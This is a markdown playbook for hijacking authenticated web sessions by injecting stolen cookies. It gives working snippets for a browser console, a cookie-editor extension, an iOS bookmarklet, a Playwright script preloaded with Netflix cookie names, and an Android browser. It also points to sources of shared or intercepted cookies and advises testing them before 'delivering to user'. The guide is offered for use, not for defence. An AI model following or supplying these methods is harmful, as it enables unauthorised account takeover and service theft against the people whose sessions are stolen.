# Cookie Injection — Session Hijacking via Browser Cookies

## Overview

Inject stolen/extracted session cookies into browser to access authenticated sessions without credentials. Works for any site that uses cookie-based auth (Netflix, social media, SaaS platforms).

## Method 1: Chrome DevTools Console (Desktop)

```javascript
// Paste in F12 → Console on target domain
document.cookie = "session_name=SESSION_VALUE; domain=.target.com; path=/; max-age=31536000";
document.cookie = "auth_token=TOKEN_VALUE; domain=.target.com; path=/; secure; max-age=31536000";
location.reload();
```

**Notes:**
- Must be on the correct domain (cookies are domain-scoped)
- `secure` flag required for HTTPS-only cookies
- `domain=.target.com` sets cookie for all subdomains
- Refresh after injection

## Method 2: EditThisCookie Extension (Desktop)

1. Install EditThisCookie (Chrome Web Store)
2. Navigate to target site
3. Click EditThisCookie icon → Import button
4. Paste JSON array of cookies:
```json
[
  {"name": "session", "value": "abc123", "domain": ".target.com", "path": "/"},
  {"name": "auth", "value": "xyz789", "domain": ".target.com", "path": "/", "secure": true}
]
```
5. Click Save → Refresh

## Method 3: iOS Safari Bookmarklet

Safari on iOS doesn't support extensions. Use bookmarklet:

1. Create bookmark on target site
2. Edit bookmark URL to:
```
javascript:void(document.cookie="name=value; domain=.target.com; path=/; max-age=31536000",document.cookie="name2=value2; domain=.target.com; path=/; secure; max-age=31536000",location.reload())
```
3. Navigate to target site → tap bookmark → cookies injected

**Limitations:**
- URL length limit (~8KB) — can't inject many cookies at once
- Some sites block `javascript:` in bookmarks (use URL bar paste instead)

## Method 4: Playwright (Programmatic)

```python
from playwright.async_api import async_playwright

async def inject_cookies(cookies, url):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()
        
        # Navigate first (set domain context)
        await page.goto(url, wait_until='domcontentloaded')
        
        # Inject cookies
        await context.add_cookies(cookies)
        
        # Navigate to authenticated area
        await page.goto(f'{url}/dashboard', wait_until='networkidle')
        
        # Verify login
        is_logged_in = 'login' not in page.url.lower()
        return is_logged_in, page

# Cookie format for Playwright:
cookies = [
    {
        'name': 'NetflixId',
        'value': 'v%3D3%26ct%3D...',
        'domain': '.netflix.com',
        'path': '/',
    },
    {
        'name': 'SecureNetflixId',
        'value': 'v%3D3%26mac%3D...',
        'domain': '.netflix.com',
        'path': '/',
        'secure': True,
    },
]
```

## Method 5: Kiwi Browser (Android)

Kiwi Browser supports Chrome extensions on Android:

1. Install Kiwi Browser (Play Store)
2. Open Kiwi → Extensions → Search "EditThisCookie"
3. Install extension
4. Navigate to target site
5. Use EditThisCookie to import cookies
6. Refresh → logged in

## Cookie Sources

| Source | Type | Freshness |
|--------|------|-----------|
| shrestha.live | Netflix cookies map, 50 countries | Updates frequently |
| Browser DevTools (own session) | Copy from Application → Cookies | Instant |
| Cookie export extensions | Bulk export from logged-in sessions | Manual |
| Network intercept (mitmproxy) | Capture from live traffic | Real-time |

## Pitfalls

1. **Expired cookies** — Most shared cookies expire quickly (hours to days). Always test before delivering to user.
2. **Domain mismatch** — Cookie domain must match exactly. `.netflix.com` works for `www.netflix.com` but `netflix.com` may not.
3. **Secure flag** — HTTPS-only cookies need `secure: true`. Missing this = cookie ignored.
4. **HttpOnly cookies** — Can't be set via `document.cookie` (JS-accessible only). Use Playwright `context.add_cookies()` instead.
5. **Session binding** — Some sites bind sessions to IP or TLS session. Cookie alone may not work.
6. **Mobile app ≠ browser** — Mobile apps use different auth (OAuth tokens, device IDs). Cookies only work in browsers.
7. **iOS limitations** — No extension support in Safari. Must use bookmarklet or 3rd party browser (Orion, Kiwi).
